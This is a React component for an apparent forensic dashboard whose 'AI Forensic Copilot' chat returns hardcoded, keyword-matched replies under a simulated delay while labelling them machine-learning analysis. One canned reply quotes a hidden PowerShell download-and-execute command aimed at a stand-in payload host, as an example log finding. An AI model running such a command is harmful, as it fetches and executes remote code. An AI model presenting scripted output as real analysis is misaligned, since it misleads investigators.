import React, { useState } from 'react';
import { useForensic } from '../context/ForensicContext';
import { Cpu, Send, ShieldCheck, Terminal, HelpCircle, Loader2 } from 'lucide-react';

export default function AIInvestigation() {
  const { aiData, detections } = useForensic();
  const [messages, setMessages] = useState([
    { sender: 'ai', text: 'Hello Investigator. I have synchronized with the security databases and analyzed your evidence segments. What details would you like to investigate regarding this intrusion path?' }
  ]);
  const [inputValue, setInputValue] = useState('');
  const [chatLoading, setChatLoading] = useState(false);

  const handleSendMessage = (e) => {
    e.preventDefault();
    if (!inputValue.trim()) return;

    const userMessage = { sender: 'user', text: inputValue };
    setMessages(prev => [...prev, userMessage]);
    setInputValue('');
    setChatLoading(true);

    // Simulate smart AI response delay
    setTimeout(() => {
      let aiResponseText = "I have analyzed your request. Based on the ingested forensic logs, the attack path indicates credential compromise via remote login attempts, followed by script downloads and TCP socket connections to indicators.";
      
      const query = inputValue.toLowerCase();
      
      if (query.includes('credential') || query.includes('user') || query.includes('login') || query.includes('brute')) {
        aiResponseText = "Logs show that the attacker initiated a brute-force dictionary attack on the 'administrator' account. After multiple failed attempts (EventID 4625), they authenticated successfully (EventID 4624) from source IP 192.168.1.142 (Windows) / 203.0.113.88 (Linux).";
      } else if (query.includes('malware') || query.includes('powershell') || query.includes('execute') || query.includes('script')) {
        aiResponseText = "Sysmon logs captured a process creation command (EventID 1): powershell.exe -nop -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString('http://cyber-threat-ioc.com/payload.ps1')\". This downloaded and executed a primary payload file in C:\\ProgramData\\.";
      } else if (query.includes('c2') || query.includes('ip') || query.includes('connection') || query.includes('network') || query.includes('port')) {
        aiResponseText = "Outbound network connection (EventID 3) established traffic streams to command-and-control server 185.220.101.4 on port 4444 (HTTPS). Standard iptables logs also caught port scanning targeting internal assets.";
      } else if (query.includes('mitigate') || query.includes('recommend') || query.includes('block') || query.includes('remedi')) {
        aiResponseText = "Remediation protocols dictate: 1) Isolate host 192.168.1.142 immediately. 2) Block outbound connections to C2 IP 185.220.101.4 and domain backdoor-c2.net. 3) Revoke and cycle all credentials for the administrator/root account. 4) Deploy MFA policies.";
      } else if (query.includes('exfiltrat') || query.includes('data') || query.includes('excel') || query.includes('zip')) {
        aiResponseText = "Exfiltration events show the attacker copied C:\\Database\\sensitive_credentials.xlsx to an archive named temp.zip in ProgramData, and uploaded it to 185.220.101.4 via SFTP protocols.";
      }

      setMessages(prev => [...prev, { sender: 'ai', text: aiResponseText }]);
      setChatLoading(false);
    }, 1200);
  };

  const samplePrompts = [
    "What compromised user credentials did the attacker use?",
    "Explain the malicious PowerShell command executed.",
    "What network C2 server and port connections were made?",
    "Show me the exfiltration details and target files.",
    "What are the immediate recommendations to block this attack?"
  ];

  return (
    <div className="space-y-6">
      <div>
        <h1 className="text-2xl font-bold tracking-wider text-white uppercase font-mono">AI Forensic Copilot</h1>
        <p className="text-sm text-slate-400">Context-aware machine learning agent compiling timelines, mapping root causes, and providing remediation actions.</p>
      </div>

      <div className="grid grid-cols-1 lg:grid-cols-3 gap-6 items-stretch">
        
        {/* AI Structural Insights */}
        <div className="space-y-6 lg:col-span-1">
          <div className="glass-card rounded-xl p-5 border border-slate-800/80 bg-slate-950/40 space-y-4 h-full flex flex-col justify-between">
            <div className="space-y-4">
              <div className="border-b border-slate-900 pb-3 flex items-center gap-2">
                <Cpu className="w-5 h-5 text-cyan-400" />
                <h3 className="text-sm font-bold text-white uppercase tracking-wider font-mono">Structural Analysis</h3>
              </div>

              <div>
                <span className="text-[10px] text-cyan-500 font-mono block uppercase">Incident Summary</span>
                <p className="text-xs text-slate-300 leading-relaxed mt-1">{aiData.incidentSummary || "No active log analysis parsed."}</p>
              </div>

              <div>
                <span className="text-[10px] text-cyan-500 font-mono block uppercase">Root Cause Identification</span>
                <p className="text-xs text-slate-300 leading-relaxed mt-1 font-semibold">{aiData.rootCause || "N/A"}</p>
              </div>

              <div>
                <span className="text-[10px] text-cyan-500 font-mono block uppercase">Remediation Roadmap</span>
                <ul className="list-disc pl-4 text-xs text-slate-400 leading-relaxed mt-1.5 space-y-2">
                  {aiData.recommendations && aiData.recommendations.map((rec, i) => (
                    <li key={i}>{rec}</li>
                  ))}
                </ul>
              </div>
            </div>

            <div className="pt-4 border-t border-slate-900">
              <div className="flex items-center gap-1.5 text-[10px] font-mono text-emerald-400">
                <ShieldCheck className="w-4 h-4" />
                AI AGENT ONLINE (LOGFORX-CORE-v2.1)
              </div>
            </div>
          </div>
        </div>

        {/* AI Assistant Chat Panel */}
        <div className="lg:col-span-2 glass-card rounded-xl border border-slate-800/80 flex flex-col h-[520px] overflow-hidden">
          
          {/* Chat Panel Header */}
          <div className="p-4 bg-slate-950/80 border-b border-slate-850 flex items-center justify-between">
            <div className="flex items-center gap-2">
              <Terminal className="w-4 h-4 text-cyan-400" />
              <span className="text-xs font-bold text-white font-mono uppercase tracking-wider">Forensic Copilot Terminal</span>
            </div>
            <span className="w-2.5 h-2.5 rounded-full bg-emerald-500 shadow-lg shadow-emerald-950/30 animate-pulse" />
          </div>

          {/* Chat Messages */}
          <div className="flex-1 p-4 overflow-y-auto space-y-4 font-mono text-xs">
            {messages.map((msg, i) => (
              <div
                key={i}
                className={`flex gap-3 max-w-[85%] ${
                  msg.sender === 'user' ? 'ml-auto flex-row-reverse' : ''
                }`}
              >
                <div className={`p-1 rounded shrink-0 h-6 w-6 flex items-center justify-center font-bold border ${
                  msg.sender === 'user' ? 'bg-purple-950 border-purple-500/30 text-purple-400' : 'bg-cyan-950 border-cyan-500/30 text-cyan-400'
                }`}>
                  {msg.sender === 'user' ? 'INV' : 'AI'}
                </div>
                
                <div className={`p-3.5 rounded-lg leading-relaxed ${
                  msg.sender === 'user' ? 'bg-purple-950/30 border border-purple-500/20 text-purple-200' : 'bg-slate-900/60 border border-slate-800 text-slate-300'
                }`}>
                  {msg.text}
                </div>
              </div>
            ))}
            
            {chatLoading && (
              <div className="flex gap-3 max-w-[85%]">
                <div className="p-1 rounded shrink-0 h-6 w-6 flex items-center justify-center font-bold border bg-cyan-950 border-cyan-500/30 text-cyan-400">
                  AI
                </div>
                <div className="p-3.5 rounded-lg bg-slate-900/60 border border-slate-800 flex items-center gap-2 text-slate-500">
                  <Loader2 className="w-4 h-4 animate-spin text-cyan-400" />
                  Analyzing log sequences...
                </div>
              </div>
            )}
          </div>

          {/* Sample prompts */}
          <div className="px-4 py-2 border-t border-slate-900 bg-slate-950/20 max-h-16 overflow-y-auto flex flex-wrap gap-2 items-center">
            <span className="text-[9px] font-mono text-slate-500 flex items-center gap-0.5 uppercase">
              <HelpCircle className="w-3 h-3" /> SUGGESTIONS:
            </span>
            {samplePrompts.map((prompt, i) => (
              <button
                key={i}
                onClick={() => setInputValue(prompt)}
                className="text-[9px] font-mono text-cyan-400/80 hover:text-cyan-300 bg-cyan-950/30 border border-cyan-500/20 hover:border-cyan-500/40 px-2 py-0.5 rounded cursor-pointer transition-colors max-w-xs truncate"
              >
                {prompt}
              </button>
            ))}
          </div>

          {/* Form Inbound Input */}
          <form onSubmit={handleSendMessage} className="p-4 border-t border-slate-900 bg-slate-950/60 flex gap-3">
            <input
              type="text"
              value={inputValue}
              onChange={(e) => setInputValue(e.target.value)}
              placeholder="Query the AI Copilot on intrusion metrics..."
              className="flex-1 glass-input rounded-lg px-4 py-2.5 text-xs font-mono"
              disabled={chatLoading}
            />
            <button
              type="submit"
              className="px-4 py-2.5 rounded-lg bg-cyan-600 hover:bg-cyan-500 text-white font-mono text-xs font-bold tracking-wider transition-colors cursor-pointer shrink-0"
              disabled={chatLoading}
            >
              <Send className="w-4 h-4" />
            </button>
          </form>

        </div>

      </div>
    </div>
  );
}
